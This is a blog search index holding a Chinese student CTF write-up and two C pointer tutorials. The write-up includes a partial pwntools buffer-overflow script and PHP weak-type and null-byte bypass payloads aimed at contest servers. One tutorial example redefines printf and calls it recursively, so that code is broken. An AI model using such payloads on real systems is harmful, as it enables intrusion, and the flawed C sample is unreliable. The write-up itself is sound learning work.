<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[班级对抗赛write up]]></title>
      <url>/2018/01/18/1/</url>
      <content type="html"><![CDATA[<p><blockquote class="blockquote-center"><br>十年饮冰，难凉热血。</blockquote></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>已经很久没有更新了，这个比赛的wp本来一直说要上传上来的，但是后来每周都是考试，就一直拖着。emmmm，还有就是，因为这学期get了印象笔记配合马克飞象，有时候有些想法就直接写在印象笔记里面了，没有直接传到博客上。这学期发现自己莫名喜欢上数据结构，接下来有时间就把一些整理的数据结构的知识整理上来好了。嘻嘻嘻嘻~这学期还不赖，和好多大佬友链了！！！！哈哈哈哈哈哈哈哈~<br><a id="more"></a></p>
<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>这个比赛形式是每个班出队伍进行比赛的，一队伍三个人，比赛时间是11.25，所以真的过了好久了。</p>
<h2 id="队伍名称、队伍成员"><a href="#队伍名称、队伍成员" class="headerlink" title="队伍名称、队伍成员"></a>队伍名称、队伍成员</h2><p>  队伍名称：facker （哈哈哈哈，我不会说这个名字是我取的）<br>  队伍成员: P4aw_N、M3tar、shEr0</p>
<h2 id="解决题目"><a href="#解决题目" class="headerlink" title="解决题目"></a>解决题目</h2><p>解决题目：<br>RE：送分题、pwnfun、爆破<br>misc: 签到、热身upupup、计算题哦、芬奇的日记、RRRSA<br>web: web1、送分代码审计、web2、Amazing magic、Love China、加0题</p>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><h3 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h3><h4 id="1-送分题"><a href="#1-送分题" class="headerlink" title="1.送分题"></a>1.送分题</h4><p>下载下来，扔到od,因为是送分题，也不想太复杂，搜索一下ascii，看到一串base64 </p>
<p><img src="/upload_images/20171125/1511573767634.png" alt=""><br><img src="/upload_images/20171125/1511573784567.png" alt=""></p>
<p>flag:D0g3{Re_1s_v3ry_ea5y!}</p>
<h4 id="2-pwnfun"><a href="#2-pwnfun" class="headerlink" title="2.pwnfun"></a>2.pwnfun</h4><p>根据题目所说一个很简单的栈溢出，开始以为是写shellcode之类的利用，后来发现出题人心软了<br>直接用ida反编译查看如下：<br><img src="/upload_images/20171125/1511596128138.png" alt=""></p>
<p>溢出点很明显，变量v4距离rbp为0x88个字节，却读入了0x100个字节<br>emmmm<br>开始的想法是写shell code利用，因为泄露栈地址很麻烦，得不到shellcode的地址，所以不行，很头大<br>后来，看ida发现出题人心软了，给了一个函数good_game<img src="/upload_images/20171125/1511596203993.png" alt=""></p>
<p>所以就很简单了，栈溢出控制返回地址，进而控制rip跳转到good_game函数执行即可<br>exp如下</p>
<pre><code>from pwn import *

HOST = &apos;222.18.158.244&apos;
PORT = 2333

payload = &apos;a&apos; * over_len
payload += p64(buf_addre)

io.recvuntil(&apos;Input your message:\n&apos;)
io.sendline(payload)
io.interactive()
</code></pre><p><img src="/upload_images/20171125/1511595936249.png" alt=""></p>
<h4 id="3-爆破"><a href="#3-爆破" class="headerlink" title="3.爆破"></a>3.爆破</h4><p>运行文件，Admin已经给出了，应该是获取文本框内容然后比对即可<br><img src="/upload_images/20171125/1511599774085.png" alt=""></p>
<p>题目给出爆破的提示，老老实实爆破<br>找到关键的流程处<br><img src="/upload_images/20171125/1511599806182.png" alt=""></p>
<p>往下执行，将全部跳转改到指向成功的函数那即可得到flag<br>D0g3{Winner_Winner_Chicken_Dinner!}</p>
<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="1-web1"><a href="#1-web1" class="headerlink" title="1.web1"></a>1.web1</h4><p>进去直接源码出来，<img src="/upload_images/20171125/1511574517021.png" alt=""><br>看到最后一行，eval(“var_dump($$args)”)  可变变量，传一个全局数组变量。args=GLOBALS<br><img src="/upload_images/20171125/1511574660400.png" alt=""></p>
<h4 id="2-送分代码审计"><a href="#2-送分代码审计" class="headerlink" title="2.送分代码审计"></a>2.送分代码审计</h4><p>看源码啥也没有，考虑源码泄露。而且源码里面base64也提示了<img src="/upload_images/20171125/1511582616740.png" alt=""></p>
<p><img src="/upload_images/20171125/1511581713641.png" alt=""><br>down下来，看到源码的意思是<code>$flag1 &amp;&amp; $flag2 &amp;&amp; $flag3</code> 都为真，就可以出flag。那本地调试一下。构造出payload:<br><code>http://45.32.90.22:2501/index.php?name=xiaohong&amp;&amp;sex=nv&amp;&amp;key=240610708&amp;&amp;pen=240610708&amp;&amp;apple=QNKCDZO</code><br>这里源码中考察了php弱类型，<code>==</code>和<code>===</code>的区别<br>这里<img src="/upload_images/20171125/1511582072895.png" alt=""><br>因为出现了比较，而在0e中是读取的科学计数法，构造出来的key的md5也是0e就ok，故构造$key = “240610708”;<br>下面<img src="/upload_images/20171125/1511582158923.png" alt=""> 同理构造。<br>payload如上，<img src="/upload_images/20171125/1511582190778.png" alt=""></p>
<p>这里给一个学习php弱类型的网站：</p>
<p><a href="https://www.cnblogs.com/Mrsm1th/p/6745532.html" target="_blank" rel="external">https://www.cnblogs.com/Mrsm1th/p/6745532.html</a></p>
<h4 id="3-web2"><a href="#3-web2" class="headerlink" title="3.web2"></a>3.web2</h4><p>这里看到源码，strlen可以通过%00来截断绕过，id==0 随便测试传个值，b需要绕过eregi 用00截断 data通过使用伪协议绕过stripos<br>payload:<br><img src="/upload_images/20171125/1511585991103.png" alt=""></p>
<h4 id="4-Amazing-magic"><a href="#4-Amazing-magic" class="headerlink" title="4.Amazing magic"></a>4.Amazing magic</h4><p>post随便传个值后在页源码中发现一句提示</p>
<p><img src="/upload_images/20171125/1511595176074.png" alt=""><br>接着post key=source<br><img src="/upload_images/20171125/1511595192422.png" alt=""></p>
<p>得到源码，源码要让number==14598366 但是字符并不能相同，所以这里想到通过转换进制 使用两个进制进行比较  把14598366转换为16进制得到0xdec0de<br>所以key=0xdec0de<br><img src="/upload_images/20171125/1511595220905.png" alt=""></p>
<h4 id="5-Love-China"><a href="#5-Love-China" class="headerlink" title="5.Love China"></a>5.Love China</h4><p>这个题要点100万次，可能不行。这里本来是想会不会有什么脚本可以跑。但是，看了一下F12。改js啊，修改clicks的值，抓包，传一个大于1000000的值，就出来了。<br><img src="/upload_images/20171125/1511596780962.png" alt=""><br><img src="/upload_images/20171125/1511596794514.png" alt=""></p>
<h4 id="6-加0题"><a href="#6-加0题" class="headerlink" title="6.加0题"></a>6.加0题</h4><p><img src="/upload_images/20171125/1511599911086.png" alt=""></p>
<p>页面给出robo.txt提示<br>访问<br><img src="/upload_images/20171125/1511599921092.png" alt=""></p>
<p>url编码，传输过去后会被默认解码一次，所以将jia0编码两次，再传入就可以得到flag<br><img src="/upload_images/20171125/1511599939423.png" alt=""></p>
<h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="1-热身upupup"><a href="#1-热身upupup" class="headerlink" title="1.热身upupup"></a>1.热身upupup</h4><p>音频隐写，没有密码提示。直接扔Au<br><img src="/upload_images/20171125/1511580044861.png" alt=""><br>摩斯电码：..- ..- ..- - ..- - ..- ..- -<br><img src="/upload_images/20171125/1511580077789.png" alt=""><br>D0g3{UUUTUTUUT}</p>
<h4 id="2-计算题哦"><a href="#2-计算题哦" class="headerlink" title="2.计算题哦"></a>2.计算题哦</h4><p><img src="/upload_images/20171125/1511589955392.png" alt=""><br>长度被限制，直接改一下length<br>出现的弹窗，base64解码<br><img src="/upload_images/20171125/1511590029909.png" alt=""></p>
<h4 id="3-芬奇的日记"><a href="#3-芬奇的日记" class="headerlink" title="3.芬奇的日记"></a>3.芬奇的日记</h4><p> 下载下来是一张png图片，先放到kali看看能不能分离<br> <img src="/upload_images/20171125/1511600051988.png" alt=""></p>
<p> 发现有两张png图片，那么就dd分离<br> <img src="/upload_images/20171125/1511600060787.png" alt=""><br> 得到了一张二维码的图片<br> <img src="/upload_images/20171125/1511600071957.png" alt=""><br>用stegsolve打开调制Gray bits得到二维码<br><img src="/upload_images/20171125/1511600087823.png" alt=""><br> 然后扫描得到下面的一串编码<br> <img src="/upload_images/20171125/1511600101750.png" alt=""></p>
<p> Base64解一下得flag<br> <img src="/upload_images/20171125/1511600244342.png" alt=""></p>
<h4 id="4-RRRSA"><a href="#4-RRRSA" class="headerlink" title="4.RRRSA"></a>4.RRRSA</h4><p>首先还是要学习一下RSA算法是什么，下面贴一下学习的地方。</p>
<p><a href="http://bobao.360.cn/learning/detail/3058.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3058.html</a></p>
<p>在这里主要思路就是先通过n计算出p,q，通过p,q再计算出d，之后就可以求出m。<br>就在我上面贴的网址里面有可以求出p,q的值的网址。<br><img src="/upload_images/20171125/1511600804371.png" alt=""><br>解出来p,q的值。<br><img src="/upload_images/20171125/1511600822607.png" alt=""><br>写一个py脚本跑一下d的值。</p>
<pre><code>def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)
def modinv(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        raise Exception(&apos;modular inverse does not exist&apos;)
    else:
        return x % m

p = 17
q = 40945572069996101
e = 65537
d=modinv(e,(p-1)*(q-1))

print(d)
</code></pre><p>跑出来d的值。<br><img src="/upload_images/20171125/1511600914169.png" alt=""><br>继续写一个脚本，出m的值。这里因为学艺不精，只能一直修改c的一行一行的值来解密。</p>
<pre><code>c=185467894761485820
d=232174645015238273
n=696074725189933717
m=pow(c,d,n)
print hex(m)[2:len(hex(m))-1].decode(&apos;hex&apos;)
</code></pre><p>这里c的值，要一行一行的换<br><img src="/upload_images/20171125/1511601045222.png" alt=""><br><img src="/upload_images/20171125/1511601101246.png" alt=""><br>这里就贴一部分了，最后解出来，就是这样。<br><img src="/upload_images/20171125/1511601085398.png" alt=""></p>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[指针数组和数组指针]]></title>
      <url>/2017/09/09/%E6%8C%87%E9%92%88%E6%95%B0%E7%BB%84%E5%92%8C%E6%95%B0%E7%BB%84%E6%8C%87%E9%92%88/</url>
      <content type="html"><![CDATA[<p><blockquote class="blockquote-center"><br>滴水石穿，非一日之功。</blockquote></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我觉得和前面一篇就是兄弟文了。这篇就写指针数组，数组指针的一些杂七杂八的东西了。虽然写起来很头疼，但是好记性不如烂笔头啊！然后再让我感叹一下，中文真是博大精深~<a id="more"></a></p>
<h2 id="指针数组"><a href="#指针数组" class="headerlink" title="指针数组"></a>指针数组</h2><h3 id="什么是指针数组"><a href="#什么是指针数组" class="headerlink" title="什么是指针数组"></a>什么是指针数组</h3><p>  指针数组 ：  数组的每一个元素是指针</p>
<p>  指针数组：array of pointers，即用于存储指针的数组，也就是数组元素都是指针</p>
<h3 id="指针数组怎么定义"><a href="#指针数组怎么定义" class="headerlink" title="指针数组怎么定义"></a>指针数组怎么定义</h3><p>类型* 数组名[数组长度]</p>
<pre><code>int* p[n]  
</code></pre><p>[]优先级高，先与p结合成为一个数组，再由int*说明这是一个整型指针数组，它有n个指针类型的数组元素。 </p>
<p> 元素表示：<code>*p[i]</code>   <code>*(p[i])</code>是一样的，因为[]优先级高于*  </p>
<font color="orange">注意：在实际应用中，对于指针数组，我们经常这样使用：</font>

<pre><code>typedef int* pInt;
pInt a[4];
</code></pre><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><h4 id="快速入门"><a href="#快速入门" class="headerlink" title="快速入门"></a>快速入门</h4><p>如要将二维数组赋给一指针数组:</p>
<pre><code>int *p[3];
int a[3][4];
for(i=0;i&lt;3;i++){
p[i]=a[i]；
p++; //该语句表示p数组指向下一个数组元素。注：此数组每一个元素都是一个指针
}
</code></pre><p>这里int *p[3] 表示一个一维数组内存放着三个指针变量，分别是p[0]、p[1]、p[2]<br>所以要分别赋值。</p>
<h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><pre><code>/*
    指针数组的使用示例
    指针数组的概念——是一个数组，数组中的每个元素是一个指针。本例假设数组是一维的。（多维指针数组在实际中很少遇到）
    本例采用简单选择排序，对指针数组中的所有元素进行排序。

    需要提醒注意的是，本例的排序只是改变了指针的指向，并没改变常量字符串在程序常量区里面内存空间的位置和长度大小等！

*/
#include &lt;stdio.h&gt;

void sort(char *name[], int n);
void printf(char *name[], int n);

int main(void)
{
    /*
      定义了一个指针数组name，通过字符串赋初值的方式给name中的每个元素（一个指针）赋初值
      需要注意的是：此处这种赋初值的方式，字符串常量全都是存储在程序的常量区，并且是根据
      字符串的实际长度来申请的空间（此步骤由编译系统自动完成，无需程序员再去malloc）。另
      外，数组的长度，也是有编译器自动确定的。
      如果各个字符串的值事先不确定，需要程序运行时由用户来确定，则本程序仍然需要调用malloc
      函数去实现。
    */
    char *name[]={&quot;Follow me&quot;, &quot;BASIC&quot;, &quot;Great Wall&quot;, &quot;FORTRAN&quot;, &quot;Computer design&quot;};
    int n = 5;

    sort(name, n);
    printf(name, n);
    return 0;
}

/***************************************************************************************
    基于指针元素类型的数组的简单选择排序方法

    排序算法不变，只不过此处元素是指针，指向字符串，所以相互的比较需要借助strcmp函数来实现，
而不是直接使用&gt;或&lt;号
 **************************************************************************************/
void sort(char *name[], int n)
{
    char *temp;
    int i, j, k;

    for (i = 0; i &lt; n - 1; i++)  //确定子序列的变化的左端
    {
        k = i;    //假定子序列的第一个元素是最大的
        for (j = i + 1; j &lt; n; j++)
        {
            if (strcmp(name[k], name[j]) &gt; 0)
            {
                k=j;   //若后续元素更大，则刷新最大元素下标k
            }
        }
        if (k != i)    //找到最大元素下标k的值之后，将最大值和第一个元素的值交换
        {
            temp = name[i];
            name[i] = name[k];
            name[k] = temp;
        }
    }
}

void printf(char *name[], int n)
{
    int i;

    for(i = 0; i &lt; n; i++)
    {
        printf(&quot;%s\n&quot;, name[i]);
    }
}
</code></pre><h4 id="图解"><a href="#图解" class="headerlink" title="图解"></a>图解</h4><p><img src="/upload_images/6.png" alt=""></p>
<h2 id="数组指针"><a href="#数组指针" class="headerlink" title="数组指针"></a>数组指针</h2><h3 id="什么是数组指针"><a href="#什么是数组指针" class="headerlink" title="什么是数组指针"></a>什么是数组指针</h3><p>数组指针 ： 本质是指针（四个字节的变量） 指向数组的指针</p>
<p>数组指针：a pointer to an array，即指向数组的指针</p>
<h3 id="数组指针怎么定义"><a href="#数组指针怎么定义" class="headerlink" title="数组指针怎么定义"></a>数组指针怎么定义</h3><p>类型说明符 (* 指针变量名) [数组长度]</p>
<pre><code>int (*p)[n];
</code></pre><p>()优先级高，首先说明p是一个指针，指向一个整型的一维数组，这个一维数组的长度是n，也可以说是p的步长。也就是说执行p+1时，p要跨过n个整型数据的长度。</p>
<h3 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h3><h4 id="快速入门-1"><a href="#快速入门-1" class="headerlink" title="快速入门"></a>快速入门</h4><p>元素表示：(*p)[i]</p>
<p>如要将二维数组赋给一指针，应这样赋值：</p>
<pre><code>int a[3][4];
int (*p)[4]; //该语句是定义一个数组指针，指向含4个元素的一维数组。
 p=a;        //将该二维数组的首地址赋给p，也就是a[0]或&amp;a[0][0]
/*也可以p=&amp;a[0][0];*/
 p++;       //该语句执行过后，也就是p=p+1;p跨过行a[0][]指向了行a[1][]
</code></pre><h4 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h4><h5 id="图解-1"><a href="#图解-1" class="headerlink" title="图解"></a>图解</h5><p><img src="/upload_images/7.png" alt=""></p>
<h5 id="案例1-数组指针和指针数组的对比"><a href="#案例1-数组指针和指针数组的对比" class="headerlink" title="案例1(数组指针和指针数组的对比)"></a>案例1(数组指针和指针数组的对比)</h5><pre><code>#include &lt;iostream&gt;

using namespace std;

int main()
{
int c[4]={1,2,3,4};
int *a[4]; //指针数组
int (*b)[4]; //数组指针
b=&amp;c;
//将数组c中元素赋给数组a
for(int i=0;i&lt;4;i++)
{
a[i]=&amp;c[i];
}
//输出看下结果
cout&lt;&lt;*a[1]&lt;&lt;endl; //输出2就对
cout&lt;&lt;(*b)[2]&lt;&lt;endl; //输出3就对
return 0;
}
</code></pre><p>注意：定义了数组指针，该指针指向这个数组的首地址，必须给指针指定一个地址，容易犯的错得就是，不给b地址，直接用(<code>*b</code>)[i]=c[i]给数组b中元素赋值，这时数组指针不知道指向哪里，调试时可能没错，但运行时肯定出现问题，使用指针时要注意这个问题。但为什么a就不用给他地址呢，a的元素是指针，实际上for循环内已经给数组a中元素指定地址了。但若在for循环内写<code>*a[i]</code>=c[i]，这同样会出问题。</p>
<h5 id="案例2"><a href="#案例2" class="headerlink" title="案例2"></a>案例2</h5><pre><code>#include &lt;stdio.h&gt;
int main()  
{  
    int a[2][2]={1,2,3,4};//这是一个2*2的二维数组  
    int (*p)[2];//数组指针  
    p=a;//令p指向数组a
    return 0;  
}
</code></pre><h6 id="分析数组，指针变量在内存中的存放"><a href="#分析数组，指针变量在内存中的存放" class="headerlink" title="分析数组，指针变量在内存中的存放"></a>分析数组，指针变量在内存中的存放</h6><p>  a中各个元素在内存中的样子</p>
<p> <img src="/upload_images/8.png" alt="">    </p>
<p>现在我们思考a,a[0],a[1],p,a+1,a[0]+1,p+1到底是什么？</p>
<p> <img src="/upload_images/9.png" alt="">    </p>
<p>分析：</p>
<p>a是一个数组名，类型是指向一维数组的指针，不是变量，a的值是指针常量，即不能有a++或者a=p这些操作。a指向这块连续空间的首地址，值是&amp;a[0][0]。</p>
<p>a[0]是一维数组名，类型是指向整型的指针，值是&amp;a[0][0]，这个值是一个常量。</p>
<p>a[1]是一维数组名，类型是指向整型的指针，值是&amp;a[1][0]，这个值是一个常量。</p>
<p>p是一个数组指针变量，指向一维数组的指针变量，值是&amp;a[0][0]。可以执行p++;p=a等操作。</p>
<p>a+1表示指向下一行元素，也可以理解为指向下一个一维数组。</p>
<p>*(a+1)是取出第一行的首地址。</p>
<p>a[0]+1是指向第0行第1个元素，也可以理解为指向一维数组a[0]的第一个元素。</p>
<p>p+1同a+1</p>
<p><code>*(p+1)</code>同<code>*(a+1)</code></p>
<p>虽然a跟a[0]值是一样，但类型不一样，表示的意义不一样。通过分析就不难理解为什么<code>*(*(a+i)+j)</code>和a[i][j]等效了。</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="1-数组名和数组指针变量的长度"><a href="#1-数组名和数组指针变量的长度" class="headerlink" title="1.数组名和数组指针变量的长度"></a>1.数组名和数组指针变量的长度</h3><h4 id="案例1"><a href="#案例1" class="headerlink" title="案例1"></a>案例1</h4><pre><code>#include&lt;stdio.h&gt;  
int  main()  
{  
    int a[2][2]={1,2,3,4};//这是一个2*2的二维数组  
    int (*p)[2];//数组指针  
    p=a;//令p指向数组a  
    printf(&quot;%d\n%d\n&quot;,sizeof a,sizeof p); 
    return 0;
}
</code></pre><p>输出：</p>
<pre><code>16
4
</code></pre><p>p是一个指针变量，这个变量占用四个字节。而a是数组名，所以sizeof a返回数组a中的全部元素占用的字节数。</p>
<h4 id="案例2-1"><a href="#案例2-1" class="headerlink" title="案例2"></a>案例2</h4><pre><code>include&lt;stdio.h&gt;  

int main()  
{  
    int a[2][2]={1,2,3,4};//这是一个2*2的二维数组  
    int (*p)[2];//数组指针  
    p=a;//令p指向数组a  
    printf(&quot;%d\n%d\n&quot;,sizeof(a+1),sizeof(p+1));  
    printf(&quot;%d\n%d\n&quot;,sizeof(a+0),sizeof(p+0)); 
    return  0;
}
</code></pre><p>输出：</p>
<pre><code>4
4
4
4
</code></pre><p>a在做+运算时是转化成了指针变量，但a[i]是一个一维数组的数组名，sizeof(a[0])的值是8。</p>
<h4 id="案例3"><a href="#案例3" class="headerlink" title="案例3"></a>案例3</h4><pre><code>#include&lt;stdio.h&gt;  

void f(int a[][2])  
{  
    printf(&quot;%d\n&quot;,sizeof a);  
}  
int  main()  
{  
    int a[2][2]={1,2,3,4};//这是一个2*2的二维数组  
    printf(&quot;%d\n&quot;,sizeof a);  
    f(a);  
    return 0；
}
</code></pre><p>输出：</p>
<pre><code>16
4
</code></pre><p>因为传参的时候数组名a转化成指针变量，注意到函数f中f(int a[][2])这里并不需要指定二维数组的长度，此处可以改为int (*a)[2]。所以传过来的就是一个数组指针变量。</p>
<h3 id="2-转化"><a href="#2-转化" class="headerlink" title="2.转化"></a>2.转化</h3><p>p+1   &lt;-&gt;  a+1  &lt;-&gt;   &amp;a[1]   &lt;-&gt;  &amp;p[1]</p>
<p><code>*(p+1)</code>  &lt;-&gt;   <code>*(a+1)</code>  &lt;-&gt;   a[1]   &lt;-&gt;   p[1]</p>
<p>p+i  &lt;-&gt;  a+i  &lt;-&gt;   &amp;a[i]   &lt;-&gt;   &amp;p[i]</p>
<p><code>*(p+i)</code> &lt;-&gt;  <code>*(a+i)</code> &lt;-&gt;   a[i]   &lt;-&gt;   p[i]</p>
<h3 id="3-数组指针的一维和二维数组"><a href="#3-数组指针的一维和二维数组" class="headerlink" title="3.数组指针的一维和二维数组"></a>3.数组指针的一维和二维数组</h3><h4 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h4><pre><code>如果a是一维数组，则有如下：
 a表示数组的首地址，即数组中第0个元素的地址
 *a= *(a+0) &lt;-&gt; a[0] ，表示数组的第0个元素的值-
 *(a+i) &lt;-&gt; a[i] 是a一维数组的第i个元素的值
</code></pre><h4 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h4><pre><code>如果a是二维数组，则有如下：
 a表示数组的首地址，即数组中第0行的首地址
 a+i是数组中第i行的首地址，即行指针
 *a= *(a+0) &lt;-&gt; a[0]是数组第0行的数组名，第0行第0列的起始地址；也可以看成是a一维数组的第0个元素(行)的地址
 *(a+i) &lt;-&gt; a[i]是数组第i行的数组名，第i行第0列的起始地址；也可以看成是a一维数组的第i个元素(行)的地址
 *(a+i)+j &lt;-&gt; a[i]+j &lt;-&gt; &amp;a[i][j]是第i行第j列的起始地址，即列指针
 *(*(a+i)+j) &lt;-&gt; *(a[i]+j) &lt;-&gt; a[i][j]是第i行第j列的元素值
</code></pre><h3 id="4-p-与-p-的区别"><a href="#4-p-与-p-的区别" class="headerlink" title="4.*(p++)与*(++p)的区别"></a>4.<code>*(p++)</code>与<code>*(++p)</code>的区别</h3><p>注：<code>*p++</code> &lt;-&gt; <code>*(p++)</code><br><code>*(p++)</code>是先执行 <code>*p</code>，后指针p累加，指向下一个地址</p>
<p><code>*（++p）</code>是先将p加一后再指向结果所在的地址</p>
]]></content>
      
        <categories>
            
            <category> 数据结构 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> C语言 </tag>
            
            <tag> 数据结构 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[指针函数和函数指针]]></title>
      <url>/2017/09/09/%E6%8C%87%E9%92%88%E5%87%BD%E6%95%B0%E5%92%8C%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88/</url>
      <content type="html"><![CDATA[<p><blockquote class="blockquote-center"><br>冰冻三尺，非一日之寒。</blockquote></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>指针函数，函数指针，指针数组，数组指针。这些个概念，感觉一直都是迷迷糊糊的不是特别的明白。最近因为在做SYC的C语言，发现后面的题，基本上都是指针指过来指过去的，就索性用了一晚上来弄这个东西。记录一下，以便以后遗忘还可以再看。<a id="more"></a></p>
<h2 id="指针函数"><a href="#指针函数" class="headerlink" title="指针函数"></a>指针函数</h2><h3 id="什么是指针函数"><a href="#什么是指针函数" class="headerlink" title="什么是指针函数"></a>什么是指针函数</h3><p>  指针函数 ： 返回值是指针的函数 </p>
<p>  指针函数<font color="red">本质</font>是一个函数，函数返回类型是某一类型的指针。</p>
<h3 id="指针函数怎么定义"><a href="#指针函数怎么定义" class="headerlink" title="指针函数怎么定义"></a>指针函数怎么定义</h3><p>类型标识符 *函数名(参数表)  </p>
<pre><code>int *f(int x,int y) 
</code></pre><p>()优先级高，先与f结合成为一个函数，再由int *说明一个这是一个整型的指针函数。</p>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><h4 id="快速入门"><a href="#快速入门" class="headerlink" title="快速入门"></a>快速入门</h4><p>这个使用法，我是这样理解的，因为这个函数是有返回值的，返回值的类型是一个地址，那么用的时候，就应该是这样。  </p>
<pre><code>float *fun(int x);//指针函数
float *p;//定义的一个指针
p = fun(a);//fun(a)是一个地址值，因为定义上他是一个指针函数，那么，它的返回值就是一个地址
</code></pre><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><pre><code>#include &lt;stdio.h&gt;

float *search(float (*pointer)[4], int n);//数组指针可以看下一章

int main(void)
{
    float score[][4]={{60,70,80,90},{56,89,67,88},{34,78,90,66}};
    float *p;
    int i, m;

    printf(&quot;enter the number of student:&quot;);
    scanf(&quot;%d&quot;, &amp;m);
    printf(&quot;The scores of No. %d are:\n&quot;,m);
    p=search(score, m);//这里就是指针函数的应用，返回的就是一个地址
    for (i = 0; i &lt; 4; i++)
    {
        printf(&quot;%5.2f\t&quot;, *(p + i));  //*(p + i)，第m行第i列的元素值（m和i都从0编号）
    }
    printf(&quot;\n&quot;);
    return 0;
}

float *search(float (*pointer)[4], int n)
{
    float * pt;
    pt = *(pointer + n); //将第n行第0列的地址给pt，以供返回
    return (pt);//这里返回的就是一个地址
}
</code></pre><h2 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h2><h3 id="什么是函数指针"><a href="#什么是函数指针" class="headerlink" title="什么是函数指针"></a>什么是函数指针</h3><p>函数指针 ： 指向函数的指针</p>
<p>函数指针<font color="red">本质</font>是一个指针变量，是指向函数的指针变量</p>
<h3 id="函数指针怎么定义"><a href="#函数指针怎么定义" class="headerlink" title="函数指针怎么定义"></a>函数指针怎么定义</h3><p>类型说明符 (* 指针变量名（函数名）)   (参数)</p>
<pre><code>int (*f)(int a, int b);
</code></pre><p>()运算符，自左至右，首先说明f是一个指针，指向一个返回值是整型的函数。</p>
<h3 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h3><h4 id="快速入门-1"><a href="#快速入门-1" class="headerlink" title="快速入门"></a>快速入门</h4><pre><code>int (*f) (int x); /*声明一个函数指针 */
f=func; /* 将func函数的首地址赋给指针f */
</code></pre><p>指向函数的指针包含了函数的地址的入口地址，可以通过它来<font color="red">调用函数。</font>  </p>
<p>这个特殊的指针指向一个返回整型值的函数。指针的声明必须和它指向函数的声明保持一致。  </p>
<p>指针名和指针运算符外面的括号改变了默认的运算符优先级。如果没有圆括号，就变成了一个返回整型指针的函数的原型声明。</p>
<h4 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h4><h5 id="案例1"><a href="#案例1" class="headerlink" title="案例1"></a>案例1</h5><pre><code>#include  &lt;stdio.h&gt;

int max(int x,int y)
{
    return (x&gt;y ? x : y);
}
int main(void)
{
    int (*p)(int ,int);//函数指针：数据类型标志符 （指针变量名）（形参列表）
    int a,b,c;
    p=max; //将max函数的首地址给指针f
    scanf(&quot;%d%d&quot;,&amp;a,&amp;b);
    c=(*p)(a,b); //指针进行调用函数
    printf(&quot;a=%d,b=%d,max=%d\n&quot;,a,b,c);
    return 0; 
}
/*这里p指的是一个指针变量，不像函数名字，他可以指向任何函数*/
</code></pre><font color="blue">p变量里面存放了max函数的地址。<code>*p</code>，此时，就相当于是取这个函数了（可以这么去理解），用来进行调用函数了。<br><br>相当于是p存放了max这个函数的地址，在用指针去调用函数max时，需要写成（<code>*p</code>）这个样子</font>

<h5 id="案例2"><a href="#案例2" class="headerlink" title="案例2"></a>案例2</h5><h6 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h6><p>下面的这个案例来说明一下上面这个问题</p>
<pre><code>#include &lt;stdio.h&gt;
int asdf(int a)
{
    printf(&quot;%d\n&quot;,a);
    return 0;
}
int main(void)
{
    int (*p)(int);
    asdf(5); //通过函数名调用函数
    p=asdf; //将asdf函数的首地址给指针p
    (*p)(5); //调用函数asdf
    p(5);  //调用函数asdf
    printf(&quot;asdf is %d,p is %d,*p is %d\n&quot;,asdf,p,*p);
    return 0;

}
</code></pre><p>输出:</p>
<pre><code>5
5
5
asdf is 4198410,p is 4198410,*p is 4198410
</code></pre><h6 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h6><p>1.通过函数名调用函数和通过函数指针调用函数的区别  </p>
<p>答：   </p>
<p>1) 通过函数名调用函数<br>eg:asdf(5);</p>
<p>步骤：<br>根据已知函数地址调用对应函数。</p>
<p>2) 函数指针调用函数<br>eg:(*p)(5);</p>
<p>1.从指针中读取函数入口地址。<br>2.调用对应函数。</p>
<p>它们之间的区别一句话概括，那就是函数名是入口地址的代号，只在编译时发挥作用（等价于一个固定地址，所以函数名不能被赋值），函数指针在执行期发挥作用（指针值可以变化，可以赋值。所以(*p)(5)与asdf(5)等价</p>
<p>2.为什么(*p)(5)与p(5)结果相等  </p>
<p>利用函数指针进行调用：  </p>
<p>(*p)()<br>p()  </p>
<p>很久很久以前C语言只允许前者，后来大家觉得这么写太麻烦就规定了后者能达到同样效果。后者在编译时和前者做相同的事情。它只是语法上的便利,本质上是一样的.  </p>
<font color="orange"><br>类似的语法上的便利还有:<br><br>p-&gt;h 通过指针访问结构成员，等价于 (<em>p).h<br>p[n] 通过指针访问数组元素等价于 </em>(p+n) </font>

